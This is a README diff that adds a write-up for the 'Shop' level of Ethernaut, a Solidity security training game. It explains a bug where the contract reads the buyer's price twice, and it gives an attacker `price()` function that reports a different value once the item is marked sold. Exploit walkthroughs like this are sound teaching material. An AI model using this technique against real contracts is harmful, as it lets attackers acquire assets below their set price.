@@ -696,6 +696,41 @@ Then call these commands in your browser's console:
     await contract.withdraw()
 ```
 
+## 21 - Shop
+
+For reference -> [Challenge](./questions/21.Shop.sol) | [Solution](./answers/21.Shop.sol)
+
+This is an easy one, so here we need to disrupt the shop by purhcasing the item at a price less than the actual price. The vulnerability lies in the `buy` function as it checks the price 2 times - one within the condition and other inside that condition block after changing `isSold` to true:
+
+```solidity
+    interface Buyer {
+        function price() external view returns (uint);
+    }
+
+    function buy() public {
+        Buyer _buyer = Buyer(msg.sender);
+
+        if (_buyer.price() >= price && !isSold) {
+            isSold = true;
+            price = _buyer.price();    
+        }
+    }
+```
+
+Thus, all we need to solve this challenge is to create a contract named Buyer with the help of provided interface, and create the logic of `price` function such that we get our item at a price less than the actual price. The contract provided in the [Solution](./answers/21.Shop.sol) file. Let's look at the `price` function there:
+
+```solidity
+    function price() external view returns (uint) {
+        if (target.isSold() == false) {
+            return 101;
+        } else {
+            return 1;
+        }
+    }
+```
+
+First condition will let us inside the `if` block of the `buy` function and then the 2nd condition will change the price to 1 which is less than the actual price. Now, deploy the contract and call the `attack` function...submit!
+
 ## Contributing
 
 Contributions to the Ethernaut_Practice project are welcome! If you have a solution to a challenge that is not yet included, or if you have suggestions for improvements, feel free to open a pull request.
